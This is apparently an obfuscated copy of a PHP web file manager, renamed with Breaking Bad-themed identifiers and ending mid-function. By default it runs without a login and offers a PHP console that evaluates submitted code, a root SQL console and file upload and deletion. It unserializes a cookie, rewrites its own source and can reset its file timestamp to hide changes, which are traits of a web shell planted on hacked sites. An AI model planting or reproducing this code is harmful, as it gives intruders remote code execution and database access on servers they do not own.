<?php








/* PHP File manager Otoshiro Ichimba */








// Configuration do not change manually!


$betterCallSaulToken = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';
$chemistryTemplates = '{"Settings":"global $labConfig;\r\nvar_export($labConfig);","Backup SQL tables":"echo backupCartelTables();"}';
$gusSqlTemplates = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';
$abqTranslation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Archiving":"Archiving","Authorization":"Authorization","Back":"Back","Cancel":"Cancel","Chinese":"Chinese","Compress":"Compress","Console":"Console","Cookie":"Cookie","Created":"Created","Date":"Date","Days":"Days","Decompress":"Decompress","Delete":"Delete","Deleted":"Deleted","Download":"Download","done":"done","Edit":"Edit","Enter":"Enter","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","French":"French","Generation time":"Generation time","German":"German","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Manage":"Manage","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset":"Reset","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Spanish":"Spanish","Submit":"Submit","Task":"Task","templates":"templates","Ukrainian":"Ukrainian","Upload":"Upload","Value":"Value","Hello":"Hello"}';
// end configuration

// Preparations

$startCookTime = explode(' ', microtime());
$startCookTime = $startCookTime[1] + $startCookTime[0];
$saulLanguages = array('en','ru','de','fr','uk');
$blueCrystalPath = empty($_REQUEST['path']) ? $blueCrystalPath = realpath('.') : realpath($_REQUEST['path']);
$blueCrystalPath = str_replace('\\', '/', $blueCrystalPath) . '/';



$mainLabPath=str_replace('\\', '/',realpath('./'));


$maybeLydiaPhar = (version_compare(phpversion(),"5.3.0","<"))?true:false;
$saulMessage = ''; // service string
$abqDefaultLanguage = 'ru';
$detectABQLanguage = true;



$breakingVersion = 1.4;

//Authorization

$gusAuthenticated = json_decode($betterCallSaulToken,true);


$gusAuthenticated['authorize'] = isset($gusAuthenticated['authorize']) ? $gusAuthenticated['authorize'] : 0; 
$gusAuthenticated['days_authorization'] = (isset($gusAuthenticated['days_authorization'])&&is_numeric($gusAuthenticated['days_authorization'])) ? (int)$gusAuthenticated['days_authorization'] : 30;


$gusAuthenticated['login'] = isset($gusAuthenticated['login']) ? $gusAuthenticated['login'] : 'admin';  
$gusAuthenticated['password'] = isset($gusAuthenticated['password']) ? $gusAuthenticated['password'] : 'phpfm';  
$gusAuthenticated['cookie_name'] = isset($gusAuthenticated['cookie_name']) ? $gusAuthenticated['cookie_name'] : 'fm_user';



$gusAuthenticated['script'] = isset($gusAuthenticated['script']) ? $gusAuthenticated['script'] : '';



// Little default config
$defaultLabConfig = array (
	'make_directory' => true, 



	'new_file' => true, 

	'upload_file' => true, 


	'show_dir_size' => false, //if true, show directory size â†’ maybe slow 

	'show_img' => true, 

	'show_php_ver' => true, 
	'show_php_ini' => false, // show path to current php.ini

	'show_gt' => true, // show generation time


	'enable_php_console' => true,
	'enable_sql_console' => true,
	'sql_server' => 'localhost',
	'sql_username' => 'root',
	'sql_password' => '',


	'sql_db' => 'test_base',
	'enable_proxy' => true,
	'show_phpinfo' => true,
	'show_xls' => true,
	'fm_settings' => true,

	'restore_time' => true,
	'fm_restore_time' => false,
);


if (empty($_COOKIE['fm_config'])) $labConfig = $defaultLabConfig;
else $labConfig = unserialize($_COOKIE['fm_config']);


// Change language
if (isset($_POST['fm_lang'])) { 
	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $gusAuthenticated['days_authorization']));



	$_COOKIE['fm_lang'] = $_POST['fm_lang'];



}



$laundryLanguage = $abqDefaultLanguage;

// Detect browser language
if($detectABQLanguage && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
	$heisenbergLanguagePriority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);

	if (!empty($heisenbergLanguagePriority)){
		foreach ($heisenbergLanguagePriority as $cartelLanguages){

			$abqLng = explode(';', $cartelLanguages);
			$abqLng = $abqLng[0];
			if(in_array($abqLng,$saulLanguages)){


				$laundryLanguage = $abqLng;
				break;
			}

		}
	}

} 

// Cookie language is primary for ever
$laundryLanguage = (empty($_COOKIE['fm_lang'])) ? $laundryLanguage : $_COOKIE['fm_lang'];







// Localization
$abqLanguage = json_decode($abqTranslation,true);
if ($abqLanguage['id']!=$laundryLanguage) {



	$getLabLanguage = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $laundryLanguage . '.json');


	if (!empty($getLabLanguage)) {

		//remove unnecessary characters
		$abqTranslationString = str_replace("'",'&#39;',json_encode(json_decode($getLabLanguage),JSON_UNESCAPED_UNICODE));


		$goodeFileContent = file_get_contents(__FILE__);
		$searchBlue = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $goodeFileContent, $methMatches);


		if (!empty($methMatches[1])) {



			$blueFileModified = filemtime(__FILE__);



			$replaceWalter = str_replace('{"'.$methMatches[1].'"}',$abqTranslationString,$goodeFileContent);

			if (file_put_contents(__FILE__, $replaceWalter)) {
				$saulMessage .= __('File updated');
			}	else $saulMessage .= __('Error occurred');
			if (!empty($labConfig['fm_restore_time'])) touch(__FILE__,$blueFileModified);
		}	
		$abqLanguage = json_decode($abqTranslationString,true);


	}

}


/* Functions */



//translation
function __($breakingText){

	global $abqLanguage;



	if (isset($abqLanguage[$breakingText])) return $abqLanguage[$breakingText];



	else return $breakingText;
};






//delete files and dirs recursively
function deleteTucoFiles($walterFile, $gusIsRecursive = false) {

	if($gusIsRecursive && @is_dir($walterFile)) {


		$capnCookElementList = scanHeisenbergDirectory($walterFile, '', '', true);
		foreach ($capnCookElementList as $elementPeriodTable) {
			if($elementPeriodTable != '.' && $elementPeriodTable != '..'){
				deleteTucoFiles($walterFile . '/' . $elementPeriodTable, true);



			}


		}



	}
	if(@is_dir($walterFile)) {
		return rmdir($walterFile);

	} else {
		return @unlink($walterFile);



	}
}


//file perms
function permissionsCartelString($walterFile, $ifHeisenberg = false){
	$carWashPermissions = fileperms($walterFile);
	$fringInfo = '';
	if(!$ifHeisenberg){
		if (($carWashPermissions & 0xC000) == 0xC000) {


			//Socket



			$fringInfo = 's';


		} elseif (($carWashPermissions & 0xA000) == 0xA000) {

			//Symbolic Link

			$fringInfo = 'l';
		} elseif (($carWashPermissions & 0x8000) == 0x8000) {



			//Regular
			$fringInfo = '-';
		} elseif (($carWashPermissions & 0x6000) == 0x6000) {
			//Block special
			$fringInfo = 'b';
		} elseif (($carWashPermissions & 0x4000) == 0x4000) {



			//Directory
			$fringInfo = 'd';



		} elseif (($carWashPermissions & 0x2000) == 0x2000) {
			//Character special



			$fringInfo = 'c';
		} elseif (($carWashPermissions & 0x1000) == 0x1000) {
			//FIFO pipe


			$fringInfo = 'p';


		} else {



			//Unknown


			$fringInfo = 'u';

		}
	}
  

	//Owner
	$fringInfo .= (($carWashPermissions & 0x0100) ? 'r' : '-');



	$fringInfo .= (($carWashPermissions & 0x0080) ? 'w' : '-');
	$fringInfo .= (($carWashPermissions & 0x0040) ?



	(($carWashPermissions & 0x0800) ? 's' : 'x' ) :


	(($carWashPermissions & 0x0800) ? 'S' : '-'));



 



	//Group
	$fringInfo .= (($carWashPermissions & 0x0020) ? 'r' : '-');
	$fringInfo .= (($carWashPermissions & 0x0010) ? 'w' : '-');
	$fringInfo .= (($carWashPermissions & 0x0008) ?



	(($carWashPermissions & 0x0400) ? 's' : 'x' ) :


	(($carWashPermissions & 0x0400) ? 'S' : '-'));
 



	//World

	$fringInfo .= (($carWashPermissions & 0x0004) ? 'r' : '-');



	$fringInfo .= (($carWashPermissions & 0x0002) ? 'w' : '-');

	$fringInfo .= (($carWashPermissions & 0x0001) ?
	(($carWashPermissions & 0x0200) ? 't' : 'x' ) :


	(($carWashPermissions & 0x0200) ? 'T' : '-'));




	return $fringInfo;

}




function convertCartelPermissions($cookingMode) {


	$cookingMode = str_pad($cookingMode,9,'-');


	$breakingTranslation = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');

	$cookingMode = strtr($cookingMode,$breakingTranslation);

	$newSaulMode = '0';
	$losPollosOwner = (int) $cookingMode[0] + (int) $cookingMode[1] + (int) $cookingMode[2]; 



	$cartelGroup = (int) $cookingMode[3] + (int) $cookingMode[4] + (int) $cookingMode[5]; 



	$abqGlobal = (int) $cookingMode[6] + (int) $cookingMode[7] + (int) $cookingMode[8]; 
	$newSaulMode .= $losPollosOwner . $cartelGroup . $abqGlobal;

	return intval($newSaulMode, 8);

}




function gusChangePermissions($walterFile, $saulValue, $breakingRecord = false) {


	$heisenbergResult = @chmod(realpath($walterFile), $saulValue);
	if(@is_dir($walterFile) && $breakingRecord){
		$capnCookElementList = scanHeisenbergDirectory($walterFile);
		foreach ($capnCookElementList as $elementPeriodTable) {
			$heisenbergResult = $heisenbergResult && gusChangePermissions($walterFile . '/' . $elementPeriodTable, $saulValue, true);
		}


	}

	return $heisenbergResult;

}






//load files

function downloadBlueFile($fringFileName) {



    if (!empty($fringFileName)) {


		if (file_exists($fringFileName)) {


			header("Content-Disposition: attachment; filename=" . basename($fringFileName));   
			header("Content-Type: application/force-download");


			header("Content-Type: application/octet-stream");
			header("Content-Type: application/download");



			header("Content-Description: File Transfer");            
			header("Content-Length: " . filesize($fringFileName));		



			flush(); // this doesn't really matter.
			$fringPointer = fopen($fringFileName, "r");


			while (!feof($fringPointer)) {

				echo fread($fringPointer, 65536);

				flush(); // this is essential for large downloads

			} 


			fclose($fringPointer);
			die();



		} else {


			header('HTTP/1.0 404 Not Found', true, 404);



			header('Status: 404 Not Found'); 


			die();
        }
    } 



}






//show folder size



function calculateLabDirectorySize($fringFile,$blueFormat=true) {
	if($blueFormat)  {



		$batchSize=calculateLabDirectorySize($fringFile,false);


		if($batchSize<=1024) return $batchSize.' bytes';
		elseif($batchSize<=1024*1024) return round($batchSize/(1024),2).'&nbsp;Kb';

		elseif($batchSize<=1024*1024*1024) return round($batchSize/(1024*1024),2).'&nbsp;Mb';

		elseif($batchSize<=1024*1024*1024*1024) return round($batchSize/(1024*1024*1024),2).'&nbsp;Gb';
		elseif($batchSize<=1024*1024*1024*1024*1024) return round($batchSize/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))


		else return round($batchSize/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)

	} else {
		if(is_file($fringFile)) return filesize($fringFile);


		$batchSize=0;
		$saulDirHandle=opendir($fringFile);
		while(($walterFile=readdir($saulDirHandle))!==false) {
			if($walterFile=='.' || $walterFile=='..') continue;
			if(is_file($fringFile.'/'.$walterFile)) $batchSize+=filesize($fringFile.'/'.$walterFile);


			else $batchSize+=calculateLabDirectorySize($fringFile.'/'.$walterFile,false);



		}



		closedir($saulDirHandle);
		return $batchSize+filesize($fringFile); 

	}
}




//scan directory
function scanHeisenbergDirectory($laundryDirectoryPath, $explosiveExport = '', $methType = 'all', $noHalfMeasuresFilter = false) {
	$losPollosDirectory = $numCartelDirs = array();
	if(!empty($explosiveExport)){


		$explosiveExport = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $explosiveExport)) . '$/';



	}
	if(!empty($methType) && $methType !== 'all'){


		$labFunction = 'is_' . $methType;



	}



	if(@is_dir($laundryDirectoryPath)){



		$hectorFileHandle = opendir($laundryDirectoryPath);



		while (false !== ($hankFilename = readdir($hectorFileHandle))) {
			if(substr($hankFilename, 0, 1) != '.' || $noHalfMeasuresFilter) {


				if((empty($methType) || $methType == 'all' || $labFunction($laundryDirectoryPath . '/' . $hankFilename)) && (empty($explosiveExport) || preg_match($explosiveExport, $hankFilename))){
					$losPollosDirectory[] = $hankFilename;



				}


			}


		}



		closedir($hectorFileHandle);
		natsort($losPollosDirectory);


	}
	return $losPollosDirectory;

}


function heisenbergMainLink($getBlue,$blueLink,$heisenbergName,$breakingTitle='') {



	if (empty($breakingTitle)) $breakingTitle=$heisenbergName.' '.basename($blueLink);



	return '&nbsp;&nbsp;<a href="?'.$getBlue.'='.base64_encode($blueLink).'" title="'.$breakingTitle.'">'.$heisenbergName.'</a>';
}

function saulArrayToOptions($saulArray,$francescaN,$selectedCrystal=''){


	foreach($saulArray as $gusV){
		$blueStuffByte=$gusV[$francescaN];



		$heisenbergResult.='<option value="'.$blueStuffByte.'" '.($selectedCrystal && $selectedCrystal==$blueStuffByte?'selected':'').'>'.$blueStuffByte.'</option>';


	}


	return $heisenbergResult;
}





function laundryLanguageForm ($currentCook='en'){
return '
<form name="change_lang" method="post" action="">
	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >
		<option value="en" '.($currentCook=='en'?'selected="selected" ':'').'>'.__('English').'</option>


		<option value="de" '.($currentCook=='de'?'selected="selected" ':'').'>'.__('German').'</option>


		<option value="ru" '.($currentCook=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>



		<option value="fr" '.($currentCook=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
		<option value="uk" '.($currentCook=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
	</select>
</form>
';



}



	


function carWashRootDirectory($fringDirectoryName){
	return ($fringDirectoryName=='.' OR $fringDirectoryName=='..');


}

function chemistryLabPanel($heisenbergString){


	$showBadDecisions=ini_get('display_errors');
	ini_set('display_errors', '1');
	ob_start();



	eval(trim($heisenbergString));


	$breakingText = ob_get_contents();

	ob_end_clean();

	ini_set('display_errors', $showBadDecisions);
	return $breakingText;

}



//SHOW DATABASES
function connectToCartelSql(){

	global $labConfig;
	return new mysqli($labConfig['sql_server'], $labConfig['sql_username'], $labConfig['sql_password'], $labConfig['sql_db']);
}



function executeSaulSql($breakingQuery){

	global $labConfig;
	$breakingQuery=trim($breakingQuery);
	ob_start();



	$cartelConnection = connectToCartelSql();

	if ($cartelConnection->connect_error) {
		ob_end_clean();	
		return $cartelConnection->connect_error;
	}
	$cartelConnection->set_charset('utf8');
    $queriedHank = mysqli_query($cartelConnection,$breakingQuery);

	if ($queriedHank===false) {
		ob_end_clean();	
		return mysqli_error($cartelConnection);
    } else {



		if(!empty($queriedHank)){



			while($saulRow = mysqli_fetch_assoc($queriedHank)) {
				$cartelQueryResult[]=  $saulRow;



			}
		}



		$heisenbergDump=empty($cartelQueryResult)?'':var_export($cartelQueryResult,true);	
		ob_end_clean();	
		$cartelConnection->close();

		return '<pre>'.stripslashes($heisenbergDump).'</pre>';


	}


}



function backupCartelTables($cartelTables = '*', $fullCookBackup = true) {


	global $blueCrystalPath;

	$huelDatabase = connectToCartelSql();



	$labDelimiter = "; \n  \n";



	if($cartelTables == '*')	{

		$cartelTables = array();
		$breakingResult = $huelDatabase->query('SHOW TABLES');


		while($saulRow = mysqli_fetch_row($breakingResult))	{



			$cartelTables[] = $saulRow[0];

		}

	} else {



		$cartelTables = is_array($cartelTables) ? $cartelTables : explode(',',$cartelTables);



	}
    
	$returnToLab='';

	foreach($cartelTables as $labTable)	{
		$breakingResult = $huelDatabase->query('SELECT * FROM '.$labTable);

		$labFieldCount = mysqli_num_fields($breakingResult);
		$returnToLab.= 'DROP TABLE IF EXISTS `'.$labTable.'`'.$labDelimiter;

		$pinkmanRowAlt = mysqli_fetch_row($huelDatabase->query('SHOW CREATE TABLE '.$labTable));
		$returnToLab.=$pinkmanRowAlt[1].$labDelimiter;
        if ($fullCookBackup) {

		for ($badgerI = 0; $badgerI < $labFieldCount; $badgerI++)  {



			while($saulRow = mysqli_fetch_row($breakingResult)) {

				$returnToLab.= 'INSERT INTO `'.$labTable.'` VALUES(';
				for($jesseJ=0; $jesseJ<$labFieldCount; $jesseJ++)	{
					$saulRow[$jesseJ] = addslashes($saulRow[$jesseJ]);

					$saulRow[$jesseJ] = str_replace("\n","\\n",$saulRow[$jesseJ]);
					if (isset($saulRow[$jesseJ])) { $returnToLab.= '"'.$saulRow[$jesseJ].'"' ; } else { $returnToLab.= '""'; }
					if ($jesseJ<($labFieldCount-1)) { $returnToLab.= ','; }
				}



				$returnToLab.= ')'.$labDelimiter;
			}
		  }



		} else { 


		$returnToLab = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $returnToLab);


		}



		$returnToLab.="\n\n\n";

	}

	//save file
    $walterFile=gmdate("Y-m-d_H-i-s",time()).'.sql';


	$walterHandle = fopen($walterFile,'w+');


	fwrite($walterHandle,$returnToLab);



	fclose($walterHandle);
	$losPollosAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $walterFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $walterFile . '&path=' . $blueCrystalPath  . '\'"';
    return $walterFile.': '.heisenbergMainLink('download',$blueCrystalPath.$walterFile,__('Download'),__('Download').' '.$walterFile).' <a href="#" title="' . __('Delete') . ' '. $walterFile . '" ' . $losPollosAlert . '>' . __('Delete') . '</a>';
}


function restoreCartelTables($sqlToCook) {


	$huelDatabase = connectToCartelSql();


	$labDelimiter = "; \n  \n";



    // Load and explode the sql file

    $fringFile = fopen($sqlToCook,"r+");
    $sqlSaulFile = fread($fringFile,filesize($sqlToCook));

    $sqlJesseArray = explode($labDelimiter,$sqlSaulFile);
	



    //Process the sql file by statements



    foreach ($sqlJesseArray as $heisenbergStatement) {

        if (strlen($heisenbergStatement)>3){



			$breakingResult = $huelDatabase->query($heisenbergStatement);


				if (!$breakingResult){
					$sqlBreakingErrorCode = mysqli_errno($huelDatabase->connection);
					$sqlBreakingErrorText = mysqli_error($huelDatabase->connection);

					$breakingSqlStatement      = $heisenbergStatement;


					break;
           	     }
           	  }
           }
if (empty($sqlBreakingErrorCode)) return __('Success').' â€” '.$sqlToCook;
else return $sqlBreakingErrorText.'<br/>'.$heisenbergStatement;



}




function blueCrystalImageUrl($hankFilename){



	return './'.basename(__FILE__).'?img='.base64_encode($hankFilename);
}

function saulHomeStyle(){


	return '

input, input.fm_input {

	text-indent: 2px;
}



input, textarea, select, input.fm_input {



	color: black;

	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;



	border-color: black;



	background-color: #FCFCFC none !important;

	border-radius: 0;
	padding: 2px;
}




input.fm_input {

	background: #FCFCFC none !important;
	cursor: pointer;


}

.home {
	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");
	background-repeat: no-repeat;



}';

}




function labConfigCheckboxRow($heisenbergName,$heisenbergValue) {



	global $labConfig;
	return '<tr><td class="row1"><input id="fm_config_'.$heisenbergValue.'" name="fm_config['.$heisenbergValue.']" value="1" '.(empty($labConfig[$heisenbergValue])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$heisenbergValue.'">'.$heisenbergName.'</td></tr>';

}

function labProtocol() {
	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';
	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';



	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';


	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';
	return 'http://';
}



function breakingSiteUrl() {
	return labProtocol().$_SERVER['HTTP_HOST'];
}

function getLabUrl($fullMeasure=false) {
	$abqHost=$fullMeasure?breakingSiteUrl():'.';
	return $abqHost.'/'.basename(__FILE__);
}

function breakingHome($fullMeasure=false){



	return '&nbsp;<a href="'.getLabUrl($fullMeasure).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';
}


function runLabInput($abqLng) {
	global $labConfig;
	$returnToLab = !empty($labConfig['enable_'.$abqLng.'_console']) ? 


	'



				<form  method="post" action="'.getLabUrl().'" style="display:inline">
				<input type="submit" name="'.$abqLng.'run" value="'.strtoupper($abqLng).' '.__('Console').'">
				</form>
' : '';
	return $returnToLab;

}

function labUrlProxy($methMatches) {
	$blueLink = str_replace('&amp;','&',$methMatches[2]);
	$labUrl = isset($_GET['url'])?$_GET['url']:'';
	$parseBreakingUrl = parse_url($labUrl);
	$abqHost = $parseBreakingUrl['scheme'].'://'.$parseBreakingUrl['host'].'/';

	if (substr($blueLink,0,2)=='//') {



		$blueLink = substr_replace($blueLink,labProtocol(),0,2);
	} elseif (substr($blueLink,0,1)=='/') {



		$blueLink = substr_replace($blueLink,$abqHost,0,1);	
	} elseif (substr($blueLink,0,2)=='./') {
		$blueLink = substr_replace($blueLink,$abqHost,0,2);	
	} elseif (substr($blueLink,0,4)=='http') {
		//alles machen wunderschon


	} else {
		$blueLink = $abqHost.$blueLink;



	} 
	if ($methMatches[1]=='href' && !strripos($blueLink, 'css')) {
		$abqBasePath = breakingSiteUrl().'/'.basename(__FILE__);
		$heisenbergQuery = $abqBasePath.'?proxy=true&url=';
		$blueLink = $heisenbergQuery.urlencode($blueLink);
	} elseif (strripos($blueLink, 'css')){



		//ĞºĞ°Ğº-Ñ‚Ğ¾ Ñ‚Ğ¾Ğ¶Ğµ Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½ÑÑ‚ÑŒ Ğ½Ğ°Ğ´Ğ¾



	}
	return $methMatches[1].'="'.$blueLink.'"';


}



 



function labTemplateForm($cartelLanguageTemplate) {

	global ${$cartelLanguageTemplate.'_templates'};



	$chemTemplateArray = json_decode(${$cartelLanguageTemplate.'_templates'},true);


	$chemString = '';

	foreach ($chemTemplateArray as $keyTemplateABQ=>$labViewTemplate) {

		$chemString .= '<tr><td class="row1"><input name="'.$cartelLanguageTemplate.'_name[]" value="'.$keyTemplateABQ.'"></td><td class="row2 whole"><textarea name="'.$cartelLanguageTemplate.'_value[]"  cols="55" rows="5" class="textarea_input">'.$labViewTemplate.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';
	}


return '
<table>
<tr><th colspan="2">'.strtoupper($cartelLanguageTemplate).' '.__('templates').' '.runLabInput($cartelLanguageTemplate).'</th></tr>

<form method="post" action="">
<input type="hidden" value="'.$cartelLanguageTemplate.'" name="tpl_edited">
<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>

'.$chemString.'
<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.getLabUrl().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
</form>
<form method="post" action="">
<input type="hidden" value="'.$cartelLanguageTemplate.'" name="tpl_edited">
<tr><td class="row1"><input name="'.$cartelLanguageTemplate.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$cartelLanguageTemplate.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>

</form>


</table>



';
}

/* End Functions */

// authorization

if ($gusAuthenticated['authorize']) {



	if (isset($_POST['login']) && isset($_POST['password'])){
		if (($_POST['login']==$gusAuthenticated['login']) && ($_POST['password']==$gusAuthenticated['password'])) {


			setcookie($gusAuthenticated['cookie_name'], $gusAuthenticated['login'].'|'.md5($gusAuthenticated['password']), time() + (86400 * $gusAuthenticated['days_authorization']));


			$_COOKIE[$gusAuthenticated['cookie_name']]=$gusAuthenticated['login'].'|'.md5($gusAuthenticated['password']);

		}
	}
	if (!isset($_COOKIE[$gusAuthenticated['cookie_name']]) OR ($_COOKIE[$gusAuthenticated['cookie_name']]!=$gusAuthenticated['login'].'|'.md5($gusAuthenticated['password']))) {
		echo '



<!doctype html>


<html>


<head>


<meta charset="utf-8" />



<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>'.__('File manager').'</title>
</head>
<body>

<form action="" method="post">
'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;



'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;


<input type="submit" value="'.__('Enter').'" class="fm_input">
</form>



'.laundryLanguageForm($laundryLanguage).'

</body>



</html>


';  
die();
	}



	if (isset($_POST['quit'])) {
		unset($_COOKIE[$gusAuthenticated['cookie_name']]);



		setcookie($gusAuthenticated['cookie_name'], '', time() - (86400 * $gusAuthenticated['days_authorization']));



		header('Location: '.breakingSiteUrl().$_SERVER['REQUEST_URI']);


	}


}

// Change config
if (isset($_GET['fm_settings'])) {



	if (isset($_GET['fm_config_delete'])) { 
		unset($_COOKIE['fm_config']);
		setcookie('fm_config', '', time() - (86400 * $gusAuthenticated['days_authorization']));
		header('Location: '.getLabUrl().'?fm_settings=true');
		exit(0);


	}	elseif (isset($_POST['fm_config'])) { 
		$labConfig = $_POST['fm_config'];
		setcookie('fm_config', serialize($labConfig), time() + (86400 * $gusAuthenticated['days_authorization']));
		$_COOKIE['fm_config'] = serialize($labConfig);
		$saulMessage = __('Settings').' '.__('done');
	}	elseif (isset($_POST['fm_login'])) { 
		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];

		$loginToRVForm = json_encode($_POST['fm_login']);


		$goodeFileContent = file_get_contents(__FILE__);
		$searchBlue = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $goodeFileContent, $methMatches);
		if (!empty($methMatches[1])) {
			$blueFileModified = filemtime(__FILE__);
			$replaceWalter = str_replace('{"'.$methMatches[1].'"}',$loginToRVForm,$goodeFileContent);
			if (file_put_contents(__FILE__, $replaceWalter)) {


				$saulMessage .= __('File updated');
				if ($_POST['fm_login']['login'] != $gusAuthenticated['login']) $saulMessage .= ' '.__('Login').': '.$_POST['fm_login']['login'];



				if ($_POST['fm_login']['password'] != $gusAuthenticated['password']) $saulMessage .= ' '.__('Password').': '.$_POST['fm_login']['password'];



				$gusAuthenticated = $_POST['fm_login'];
			}
			else $saulMessage .= __('Error occurred');



			if (!empty($labConfig['fm_restore_time'])) touch(__FILE__,$blueFileModified);

		}
	} elseif (isset($_POST['tpl_edited'])) { 


		$cartelLanguageTemplate = $_POST['tpl_edited'];

		if (!empty($_POST[$cartelLanguageTemplate.'_name'])) {

			$chemistryPanel = json_encode(array_combine($_POST[$cartelLanguageTemplate.'_name'],$_POST[$cartelLanguageTemplate.'_value']),JSON_HEX_APOS);
